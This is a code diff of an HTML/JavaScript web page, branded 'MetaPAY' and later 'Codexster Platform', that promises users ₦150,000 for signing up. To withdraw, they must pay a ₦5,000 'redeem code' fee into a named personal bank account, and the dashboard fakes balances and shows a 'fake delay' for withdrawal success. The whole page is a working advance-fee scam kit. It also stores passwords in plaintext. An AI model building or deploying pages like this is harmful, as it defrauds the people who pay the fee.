@@ -2,163 +2,321 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Registration & Dashboard</title>
+  <title>Codexster Platform</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; background:gray; }
-    .container { max-width: 400px; margin: 40px auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);}
-    input, button { width: 90%; padding: 10px; margin: 8px 0; border-radius: 5px; border: 1px solid #ccc; }
-    button { background: #007bff; color: white; cursor: pointer; font-weight: bold; }
-    button:hover { background: #0056b3; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #4e54c8, #8f94fb);
+      color: #fff;
+    }
+    header {
+      text-align: center;
+      padding: 20px;
+      font-size: 24px;
+      font-weight: bold;
+      animation: slideDown 1s ease-in-out;
+    }
+    @keyframes slideDown {
+      from {transform: translateY(-50px); opacity: 0;}
+      to {transform: translateY(0); opacity: 1;}
+    }
+    .container {
+      max-width: 400px;
+      margin: 30px auto;
+      background: rgba(0,0,0,0.6);
+      padding: 25px;
+      border-radius: 15px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.4);
+      animation: fadeIn 1s ease-in;
+    }
+    @keyframes fadeIn {
+      from {opacity: 0;}
+      to {opacity: 1;}
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 15px;
+    }
+    input, select {
+      background: #f1f1f1;
+      color: #333;
+    }
+    button {
+      background: #ff9800;
+      color: white;
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    button:hover {
+      transform: scale(1.05);
+      background: #e68900;
+    }
     .hidden { display: none; }
-    p { font-size: 14px; }
-    .date{
-    color:blue;
+    nav {
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    nav button {
+      background: #2196F3;
+      margin: 0 5px;
+    }
+    footer {
+      text-align: center;
+      padding: 15px;
+      margin-top: 30px;
+      font-size: 14px;
+      background: rgba(0,0,0,0.7);
+    }
+    .balance-box {
+      background: #2196F3;
+      padding: 15px;
+      border-radius: 10px;
+      margin-bottom: 15px;
+      text-align: center;
+      font-size: 18px;
+      font-weight: bold;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 15px;
+    }
+    table th, table td {
+      border: 1px solid #ddd;
+      padding: 8px;
+      color: #000;
+      background: #fff;
+    }
+    table th {
+      background: #2196F3;
+      color: #fff;
+    }
+    /* Modal */
+    .modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+    .modal-content {
+      background: #fff;
+      padding: 20px;
+      border-radius: 10px;
+      text-align: center;
+      color: #333;
+      animation: popIn 0.5s ease;
+    }
+    @keyframes popIn {
+      from {transform: scale(0.5); opacity: 0;}
+      to {transform: scale(1); opacity: 1;}
     }
   </style>
 </head>
 <body>
-<div class="container" id="registerPage">
-  <h3>Welcome to MetaPAY register and get yiur 100k instantly</h3>
-  <h2>Register</h2>
-  
-  <input type="text" id="regUsername" placeholder="Username" required>
-  <input type="password" id="regPassword" placeholder="Password" required><br>
-  
-  <button onclick="register()">Register</button>
-  <p>Already have an account? <a href="#" onclick="showLogin()">Login</a></p>
-</div>
+  <header>Welcome to metapay.Register and get NGN150000</header>
 
-<!-- LOGIN PAGE -->
-<div class="container hidden" id="loginPage">
-<h3>Welcome back to MetaPAY</h3>
-  <h2>Login</h2>
-  <input type="text" id="loginUsername" placeholder="Username" required>
-  <input type="password" id="loginPassword" placeholder="Password" required>
-  <button onclick="login()">Login</button>
-  <p>No account? <a href="#" onclick="showRegister()">Register</a></p>
-</div>
+  <!-- Registration Form -->
+  <div class="container" id="registerPage">
+    <h2>Register</h2>
+    <input type="text" id="regName" placeholder="Full Name" required>
+    <input type="email" id="regEmail" placeholder="Email" required>
+    <input type="password" id="regPass" placeholder="Password" required>
+    <button onclick="register()">Register</button>
+    <p>Already have an account? <a href="#" onclick="showLogin()">Login here</a></p>
+  </div>
 
-<!-- DASHBOARD -->
-<div class="container hidden" id="dashboardPage">
-  <h2>Welcome, <span id="userName"></span></h2>
-  <p>Your Welcome Bonus: <b>₦<span id="userBalance">100000</span></b></p>
-  <p id="codeSection" class="hidden">Your Withdrawal Code: <b><span id="userCode"></span></b></p>
-  <button onclick="showCashout()">Cash Out</button>
-  <button onclick="showBuyCode()">Buy Code</button>
-  <br>
-  <br>
-  <a href="http://wa.me/08123227444?text= Hello i want purchase withdraw code"><button> whatsApp</button></a>
-  
-</div>
+  <!-- Login Form -->
+  <div class="container hidden" id="loginPage">
+    <h2>Login</h2>
+    <input type="email" id="logEmail" placeholder="Email" required>
+    <input type="password" id="logPass" placeholder="Password" required>
+    <button onclick="login()">Login</button>
+    <p>Don’t have an account? <a href="#" onclick="showRegister()">Register here</a></p>
+  </div>
 
-<!-- CASH OUT PAGE -->
-<div class="container hidden" id="cashoutPage">
-  <h2>Cash Out</h2>
-  <input type="text" id="bankName" placeholder="Bank Name" required>
-  <input type="text" id="accountNumber" placeholder="Account Number" required>
-  <input type="text" id="accountName" placeholder="Account Name" required>
-  <input type="text" id="withdrawCode" placeholder="Enter Withdrawal Code" required>
-  <button onclick="submitCashout()">Withdraw</button>
-  <p id="cashoutMsg"></p>
-  <button onclick="backToDashboard()">Back</button>
-</div>
+  <!-- Dashboard -->
+  <div class="container hidden" id="dashboardPage">
+    <h2>Welcome, <span id="userName"></span></h2>
+    <div class="balance-box">Balance: ₦<span id="balance">0</span></div>
+    <p id="welcomeMsg" style="color:lightgreen;"></p>
+    <nav>
+      <button onclick="showWithdraw()">Withdraw</button>
+      <br><br>
+      <button onclick="showBuyCode()">Buy Redeem Code</button><br><br>
+      <button onclick="showHistory()">Transaction History</button>
+    </nav>
+    <div id="dashContent"></div>
+  </div>
 
-<!-- BUY CODE PAGE -->
-<div class="container hidden" id="buyCodePage">
-  <h2>Buy Code</h2>
-  <p>Make payment of 5k to:</p>
-  <b>Account: 8144281750</b>
-  <br>
-  <b>
-  Bank:moniepoint</b><br>
-<b>  Bank holder:Dauda joseph</b>
-  <button onclick="submitBuyCode()">I Have Made Payment</button>
-  <p id="buyMsg"></p>
-  <button onclick="backToDashboard()">Back</button>
-</div>
+  <!-- Modal -->
+  <div class="modal" id="processModal">
+    <div class="modal-content">
+      <h3>Processing withdrawal...</h3>
+      <p>Please wait a moment</p>
+    </div>
+  </div>
 
-<script>
-// Switch Pages
-function showLogin(){ document.getElementById("registerPage").classList.add("hidden"); document.getElementById("loginPage").classList.remove("hidden"); }
-function showRegister(){ document.getElementById("loginPage").classList.add("hidden"); document.getElementById("registerPage").classList.remove("hidden"); }
-function showCashout(){ document.getElementById("dashboardPage").classList.add("hidden"); document.getElementById("cashoutPage").classList.remove("hidden"); }
-function showBuyCode(){ document.getElementById("dashboardPage").classList.add("hidden"); document.getElementById("buyCodePage").classList.remove("hidden"); }
-function backToDashboard(){ document.getElementById("cashoutPage").classList.add("hidden"); document.getElementById("buyCodePage").classList.add("hidden"); document.getElementById("dashboardPage").classList.remove("hidden"); }
+  <footer>© Codexster 2025</footer>
 
-// Register
-function register(){
-  let user = document.getElementById("regUsername").value;
-  let pass = document.getElementById("regPassword").value;
-  if(user && pass){
-    localStorage.setItem("username", user);
-    localStorage.setItem("password", pass);
-    localStorage.setItem("balance", 100000);
-    localStorage.removeItem("withdrawCode"); // no code yet
-    alert("Registration successful!You have NGN100000");
-    showLogin();
-  } else {
-    alert("Fill all fields");
-  }
-}
+  <script>
+    let users = JSON.parse(localStorage.getItem("users")) || [];
+    let currentUser = null;
+    const SECRET_CODE = "225500"; // only you (admin) know this
 
-// Login
-function login(){
-  let user = document.getElementById("loginUsername").value;
-  let pass = document.getElementById("loginPassword").value;
-  let storedUser = localStorage.getItem("username");
-  let storedPass = localStorage.getItem("password");
-  if(user === storedUser && pass === storedPass){
-    document.getElementById("loginPage").classList.add("hidden");
-    document.getElementById("dashboardPage").classList.remove("hidden");
-    document.getElementById("userName").innerText = storedUser;
-    document.getElementById("userBalance").innerText = localStorage.getItem("balance");
+    function register() {
+      let name = document.getElementById("regName").value;
+      let email = document.getElementById("regEmail").value;
+      let pass = document.getElementById("regPass").value;
 
-    let code = localStorage.getItem("withdrawCode");
-    if(code){
-      document.getElementById("userCode").innerText = code;
-      document.getElementById("codeSection").classList.remove("hidden");
-    } else {
-      document.getElementById("codeSection").classList.add("hidden");
-    }
-  } else {
-    alert("Wrong username or password");
-  }
-}
-
-// Submit Cashout
-function submitCashout(){
-  let bank = document.getElementById("bankName").value;
-  let acct = document.getElementById("accountNumber").value;
-  let name = document.getElementById("accountName").value;
-  let code = document.getElementById("withdrawCode").value;
-
-  let correctCode = localStorage.getItem("withdrawCode");
-  let balance = parseInt(localStorage.getItem("balance")) || 0;
-
-  if(bank && acct && name && code){
-    if(correctCode && code === correctCode){
-      if(balance > 0){
-        document.getElementById("cashoutMsg").innerText = "Withdrawal request submitted for processing.";
-        localStorage.setItem("balance", 0);
-        document.getElementById("userBalance").innerText = "0";
-      } else {
-        document.getElementById("cashoutMsg").innerText = "You have no balance left to withdraw.";
+      if(!name || !email || !pass){
+        alert("Please fill all fields");
+        return;
       }
-    } else {
-      alert("Invalid or missing withdrawal code! Please buy code first.");
+      if(users.find(u=>u.email === email)){
+        alert("Email already registered!");
+        return;
+      }
+      let user = {name, email, pass, balance:150000, transactions:[], hasCode:false};
+      users.push(user);
+      localStorage.setItem("users", JSON.stringify(users));
+      alert("You have successfully registered and received ₦150,000!");
+      showLogin();
     }
-  } else {
-    alert("Please fill all details and enter your code.");
-  }
-}
 
-// Buy Code
-function submitBuyCode(){
-  // Generate withdrawal code after payment
-  let code = Math.floor(10000 + Math.random() * 90000); // random 5-digit code
-  localStorage.setItem("withdrawCode", code);
-  document.getElementById("buyMsg").innerText = "Payment being processed... Your withdrawal code is now active.";
-}
-</script>
+    function login() {
+      let email = document.getElementById("logEmail").value;
+      let pass = document.getElementById("logPass").value;
+
+      let user = users.find(u=>u.email === email && u.pass === pass);
+      if(!user){
+        alert("Invalid login!");
+        return;
+      }
+      currentUser = user;
+      localStorage.setItem("currentUser", JSON.stringify(user));
+      loadDashboard();
+    }
+
+    function loadDashboard() {
+      document.getElementById("registerPage").classList.add("hidden");
+      document.getElementById("loginPage").classList.add("hidden");
+      document.getElementById("dashboardPage").classList.remove("hidden");
+
+      let user = JSON.parse(localStorage.getItem("currentUser"));
+      document.getElementById("userName").textContent = user.name;
+      document.getElementById("balance").textContent = user.balance;
+      document.getElementById("welcomeMsg").textContent = "You have successfully registered and received ₦150,000.";
+    }
+
+    function showRegister(){
+      document.getElementById("registerPage").classList.remove("hidden");
+      document.getElementById("loginPage").classList.add("hidden");
+    }
+    function showLogin(){
+      document.getElementById("loginPage").classList.remove("hidden");
+      document.getElementById("registerPage").classList.add("hidden");
+    }
+
+    function showWithdraw(){
+      document.getElementById("dashContent").innerHTML = `
+        <h3>Withdraw Funds</h3>
+        <input type="number" id="amount" placeholder="Enter Amount">
+        <input type="text" id="bank" placeholder="Select Bank">
+        <input type="text" id="acctNo" placeholder="Account Number">
+        <input type="text" id="acctName" placeholder="Account Name">
+        <input type="password" id="userCode" placeholder="Enter Redeem Code">
+        <button onclick="withdraw()">Withdraw</button>
+      `;
+    }
+
+    function withdraw(){
+      let amt = parseInt(document.getElementById("amount").value);
+      let code = document.getElementById("userCode").value;
+      let user = JSON.parse(localStorage.getItem("currentUser"));
+
+      if(code !== SECRET_CODE){
+        alert("Invalid or missing redeem code! Please your redeem buy .");
+        return;
+      }
+      if(amt > user.balance){
+        alert("Insufficient balance!");
+        return;
+      }
+
+      document.getElementById("processModal").style.display = "flex";
+
+      setTimeout(()=>{
+        document.getElementById("processModal").style.display = "none";
+        user.balance -= amt;
+        user.transactions.push({type:"Withdraw", amount:amt, status:"Successful", date:new Date().toLocaleString()});
+        localStorage.setItem("currentUser", JSON.stringify(user));
+        users = users.map(u=>u.email===user.email?user:u);
+        localStorage.setItem("users", JSON.stringify(users));
+        document.getElementById("balance").textContent = user.balance;
+        alert("Withdrawal successful!");
+      }, 2000); // fake delay
+    }
+
+    function showBuyCode(){
+      document.getElementById("dashContent").innerHTML = `
+        <h3>Buy Redeem Code</h3>
+        <p>Please make a payment 5000 for the code fee to the account below:</p>
+        <p><b>Bank:</b> Opay Bank</p>
+        <p><b>Account Number:</b> <span id="acctNoCopy">8144281750</span> 
+        <p><b>Account Name:</b>Dauda Joseph</p>
+      <button onclick="copyAcct()">Copy</button></p>
+        
+        <button onclick="confirmPayment()">I have made the payment</button>
+      `;
+    }
+
+    function copyAcct(){
+      let text = document.getElementById("acctNoCopy").textContent;
+      navigator.clipboard.writeText(text);
+      alert("Account number copied!");
+    }
+
+    function confirmPayment(){
+      let user = JSON.parse(localStorage.getItem("currentUser"));
+      user.transactions.push({type:"Buy Redeem Code", amount:"-", status:"Processing", date:new Date().toLocaleString()});
+      localStorage.setItem("currentUser", JSON.stringify(user));
+      users = users.map(u=>u.email===user.email?user:u);
+      localStorage.setItem("users", JSON.stringify(users));
+      alert("Your payment is being processed. Please wait for the admin to send your redeem code.");
+    }
+
+    function showHistory(){
+      let user = JSON.parse(localStorage.getItem("currentUser"));
+      let rows = user.transactions.map(t=>`
+        <tr>
+          <td>${t.date}</td>
+          <td>${t.type}</td>
+          <td>${t.amount}</td>
+          <td>${t.status}</td>
+        </tr>
+      `).join("");
+      document.getElementById("dashContent").innerHTML = `
+        <h3>Transaction History</h3>
+        <table>
+          <tr><th>Date</th><th>Type</th><th>Amount</th><th>Status</th></tr>
+          ${rows || "<tr><td colspan='4'>No transactions yet</td></tr>"}
+        </table>
+      `;
+    }
+
+    // Auto load dashboard if already logged in
+    if(localStorage.getItem("currentUser")){
+      loadDashboard();
+    }
+  </script>
 </body>
 </html>
